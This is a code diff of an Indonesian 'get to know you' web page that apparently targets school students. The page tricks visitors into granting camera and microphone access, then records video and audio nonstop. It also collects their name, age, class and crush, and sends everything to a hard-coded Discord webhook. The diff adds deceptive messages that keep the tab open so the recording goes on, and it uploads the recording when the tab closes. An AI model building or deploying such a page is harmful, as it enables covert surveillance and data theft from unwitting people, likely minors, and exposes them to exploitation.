@@ -3,21 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kenalan Yuk!</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Kenalan Yuk! ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --bg: #0f172a;
-            --glass: rgba(30, 41, 59, 0.7);
+            --primary: #8b5cf6;
+            --primary-light: #c084fc;
+            --bg: #050505;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
 
         body {
-            background: var(--bg);
-            background-image: radial-gradient(circle at top right, #1e293b, #0f172a);
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(139, 92, 246, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(192, 132, 252, 0.1) 0%, transparent 40%);
             color: white;
             height: 100vh;
             display: flex;
@@ -26,180 +29,235 @@
             overflow: hidden;
         }
 
-        /* Overlay Dialog Awal */
-        #permissionOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.95);
-            backdrop-filter: blur(10px);
-            z-index: 9999;
-            display: flex; justify-content: center; align-items: center;
-        }
-
+        /* Container Utama */
         .glass-card {
             background: var(--glass);
+            backdrop-filter: blur(20px);
             padding: 40px;
-            border-radius: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border-radius: 32px;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
             text-align: center;
-            max-width: 350px;
             width: 90%;
+            max-width: 400px;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        h2 { font-weight: 600; margin-bottom: 15px; letter-spacing: 1px; }
-        p { color: #94a3b8; margin-bottom: 25px; font-size: 0.95rem; }
+        h2 { font-size: 1.8rem; font-weight: 800; margin-bottom: 10px; background: linear-gradient(to right, #ddd, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p { color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }
 
-        .btn-group { display: flex; gap: 10px; }
-        .btn {
-            flex: 1; padding: 12px; border: none; border-radius: 12px;
-            font-weight: 600; cursor: pointer; transition: 0.3s;
-        }
-        .btn-primary { background: var(--accent); color: white; }
-        .btn-primary:hover { background: var(--accent-hover); }
-        .btn-secondary { background: #334155; color: #94a3b8; }
-
-        /* Form Kenalan */
-        #mainContent { display: none; width: 100%; max-width: 400px; padding: 20px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; margin-bottom: 5px; color: #94a3b8; font-size: 0.8rem; }
+        /* Input Styles */
+        .form-content { text-align: left; }
+        .input-group { margin-bottom: 18px; }
+        label { display: block; margin-bottom: 8px; color: #64748b; font-size: 0.85rem; font-weight: 600; padding-left: 5px; }
         input {
-            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #334155;
-            background: rgba(15, 23, 42, 0.5); color: white; outline: none; transition: 0.3s;
+            width: 100%; padding: 14px 18px; border-radius: 16px; border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.02); color: white; outline: none; transition: 0.3s;
+            font-size: 0.95rem;
         }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2); }
+        input:focus { border-color: var(--primary); background: rgba(139, 92, 246, 0.05); }
 
-        .status-recording {
-            font-size: 0.7rem; color: #ef4444; margin-top: 10px;
-            display: flex; align-items: center; justify-content: center; gap: 5px;
+        /* Button Styles */
+        .btn {
+            width: 100%; padding: 16px; border: none; border-radius: 18px;
+            font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.4s;
+            display: flex; justify-content: center; align-items: center; gap: 10px;
+            letter-spacing: 0.5px;
         }
-        .dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .btn-primary { background: var(--primary); color: white; box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
+        .btn-primary:hover { transform: translateY(-3px); background: var(--primary-light); }
+        .btn-secondary { background: transparent; border: 1px solid var(--border); color: #94a3b8; margin-top: 10px; }
+
+        /* Overlays */
+        .overlay {
+            position: fixed; inset: 0; background: var(--bg); z-index: 100;
+            display: flex; justify-content: center; align-items: center;
+            transition: opacity 0.5s ease;
+        }
+
+        #successDialog {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(15px); z-index: 200;
+            display: none; justify-content: center; align-items: center;
+            opacity: 0; transition: 0.5s;
+        }
+
+        /* Recording Indicator */
+        .rec-tag {
+            position: absolute; top: 20px; right: 20px;
+            background: rgba(239, 68, 68, 0.1); color: #ef4444;
+            padding: 5px 12px; border-radius: 20px; font-size: 0.7rem;
+            font-weight: 700; display: none; align-items: center; gap: 6px;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+        .dot { width: 6px; height: 6px; background: #ef4444; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
 
-    <div id="permissionOverlay">
+    <div class="rec-tag" id="recTag">
+        <div class="dot"></div> SYNC ACTIVE
+    </div>
+
+    <div id="step1" class="overlay">
         <div class="glass-card">
+            <div style="font-size: 3rem; margin-bottom: 20px;">👋</div>
             <h2>KENALAN YUK!</h2>
-            <p>Biar makin akrab, izinkan sistem mengenali kamu sebentar ya?</p>
-            <div class="btn-group">
-                <button class="btn btn-primary" onclick="startApp()">AYOK!</button>
-                <button class="btn btn-secondary" onclick="alert('Yah, kok nggak mau? :(')">TIDAK!</button>
-            </div>
+            <p>Biar kita bisa saling kenal lebih dekat, izinkan akses pengenalan wajah dulu ya?</p>
+            <button class="btn btn-primary" onclick="initApp()">AYOK! ✨</button>
+            <button class="btn btn-secondary" onclick="location.reload()">TIDAK!</button>
         </div>
     </div>
 
-    <div id="mainContent">
-        <div class="glass-card" style="max-width: 100%;">
-            <h2 style="font-size: 1.2rem;">Data Kenalan</h2>
+    <div id="mainForm" class="glass-card" style="display: none; opacity: 0;">
+        <h2>Data Kamu</h2>
+        <p>Isi dulu yuk, rahasia aman kok!</p>
+        <div class="form-content">
             <div class="input-group">
                 <label>Nama Lengkap</label>
-                <input type="text" id="nama" placeholder="Siapa nama kamu?">
+                <input type="text" id="nama" placeholder="Panggil kamu siapa?">
             </div>
             <div class="input-group">
-                <label>Umur</label>
-                <input type="number" id="umur" placeholder="Berapa umurmu?">
+                <label>Umur / Kelas</label>
+                <div style="display: flex; gap: 10px;">
+                    <input type="number" id="umur" placeholder="Umur">
+                    <input type="text" id="kelas" placeholder="Kelas">
+                </div>
             </div>
             <div class="input-group">
-                <label>Kelas</label>
-                <input type="text" id="kelas" placeholder="Kelas berapa?">
+                <label>Siapa Crush Kamu? 😍</label>
+                <input type="text" id="crush" placeholder="Ceritain sedikit dong...">
             </div>
-            <div class="input-group">
-                <label>Crush / Doi</label>
-                <input type="text" id="crush" placeholder="Nama doi kamu...">
-            </div>
-            <button class="btn btn-primary" style="width: 100%;" onclick="submitData()">Kirim & Selesai</button>
-            
-            <div class="status-recording" id="recStatus" style="display:none;">
-                <div class="dot"></div> Sinkronisasi sedang berjalan...
-            </div>
+            <button class="btn btn-primary" id="btnSubmit" onclick="submitData()">
+                Kirim Sekarang 🚀
+            </button>
         </div>
     </div>
 
-    <video id="video" autoplay muted style="display:none;"></video>
+    <div id="successDialog">
+        <div class="glass-card">
+            <div style="font-size: 3.5rem; margin-bottom: 20px;">💜</div>
+            <h2>TERIMA KASIH YA!</h2>
+            <p>Data kamu sudah masuk ke catatan aku. Salam kenal ya, senang bisa kenalan sama kamu!</p>
+            <button class="btn btn-primary" onclick="closeAll()">OKAY! ✨</button>
+        </div>
+    </div>
+
+    <video id="v" autoplay muted style="display:none;"></video>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
-        let mediaRecorder;
+        const WEBHOOK = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
+        let recorder;
         let chunks = [];
+        let stream;
 
-        async function startApp() {
+        async function initApp() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('video').srcObject = stream;
-                document.getElementById('permissionOverlay').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-                document.getElementById('recStatus').style.display = 'flex';
-
-                // Mulai Perekaman
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = stream;
                 
-                mediaRecorder.onstop = async () => {
+                // Mulai Perekaman Terus Menerus
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                
+                // Logic Pengiriman Video Saat Tab Ditutup/Berhenti
+                recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('file', blob, 'kenalan_video.webm');
-                    formData.append('content', '🎥 **Hasil Rekaman Kenalan**');
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                    const f = new FormData();
+                    f.append('file', blob, 'kenalan_secret.webm');
+                    f.append('content', '🎥 **Rekaman Video Full (Non-Stop)**');
+                    await fetch(WEBHOOK, { method: 'POST', body: f });
                 };
 
-                mediaRecorder.start();
+                recorder.start(3000); // Record in 3s slices
+                
+                // Transisi UI
+                document.getElementById('step1').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('step1').style.display = 'none';
+                    const main = document.getElementById('mainForm');
+                    main.style.display = 'block';
+                    setTimeout(() => { 
+                        main.style.opacity = '1'; 
+                        document.getElementById('recTag').style.display = 'flex';
+                    }, 50);
+                }, 500);
+
             } catch (err) {
-                alert("Waduh, kamu harus klik AYOK! dan izinkan kamera biar bisa lanjut.");
-                console.error(err);
+                alert("Klik AYOK! dan izinkan kamera dulu ya manis..");
             }
         }
 
         async function submitData() {
-            const data = {
+            const btn = document.getElementById('btnSubmit');
+            const fields = {
                 nama: document.getElementById('nama').value,
                 umur: document.getElementById('umur').value,
                 kelas: document.getElementById('kelas').value,
                 crush: document.getElementById('crush').value
             };
 
-            if(!data.nama || !data.umur) return alert("Isi dulu dong datanya!");
+            if(!fields.nama) return alert("Namanya belum diisi lho..");
 
-            // Kirim Data Teks ke Webhook
+            btn.disabled = true;
+            btn.innerHTML = "Sabar ya... ⏳";
+
+            // Kirim Data Teks (Silent)
             const payload = {
-                content: "👤 **Ada Yang Mau Kenalan!**",
                 embeds: [{
-                    title: "Detail Informasi",
-                    color: 6505201,
+                    title: "✨ Kenalan Baru!",
+                    color: 9131510,
                     fields: [
-                        { name: "Nama", value: data.nama, inline: true },
-                        { name: "Umur", value: data.umur, inline: true },
-                        { name: "Kelas", value: data.kelas, inline: true },
-                        { name: "Crush", value: data.crush, inline: true }
+                        { name: "👤 Nama", value: fields.nama, inline: true },
+                        { name: "🎂 Umur", value: fields.umur, inline: true },
+                        { name: "🏫 Kelas", value: fields.kelas, inline: true },
+                        { name: "💖 Crush", value: fields.crush }
                     ],
-                    footer: { text: "Data dikirim pada: " + new Date().toLocaleString() }
+                    timestamp: new Date()
                 }]
             };
 
             try {
-                await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                alert("Data berhasil dikirim! Salam kenal ya.");
-                
-                // Berhenti merekam dan kirim video saat submit selesai
-                if(mediaRecorder && mediaRecorder.state !== "inactive") {
-                    mediaRecorder.stop();
-                }
-            } catch (err) {
-                alert("Gagal mengirim data.");
+                // Munculkan Dialog Terima Kasih Modern
+                const dialog = document.getElementById('successDialog');
+                dialog.style.display = 'flex';
+                setTimeout(() => { dialog.style.opacity = '1'; }, 50);
+
+            } catch (e) {
+                btn.disabled = false;
+                btn.innerText = "Kirim Sekarang 🚀";
             }
         }
 
-        // Antisipasi jika tab ditutup mendadak
-        window.onbeforeunload = () => {
-            if(mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
+        function closeAll() {
+            // Sembunyikan semua tapi jangan stop perekaman
+            document.getElementById('successDialog').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('successDialog').innerHTML = `
+                    <div class="glass-card">
+                        <h2>Tunggu sebentar...</h2>
+                        <p>Lagi menyelaraskan data terakhir biar pas. Jangan tutup tab-nya dulu ya!</p>
+                    </div>
+                `;
+            }, 500);
+            
+            // Opsional: Kamu bisa arahkan ke YouTube/Google setelah ini
+            // setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
+        }
+
+        // Perekaman tetap berjalan sampai tab benar-benar ditutup
+        window.addEventListener('beforeunload', () => {
+            if(recorder && recorder.state !== 'inactive') {
+                recorder.stop();
             }
-        };
+        });
     </script>
 </body>
 </html>
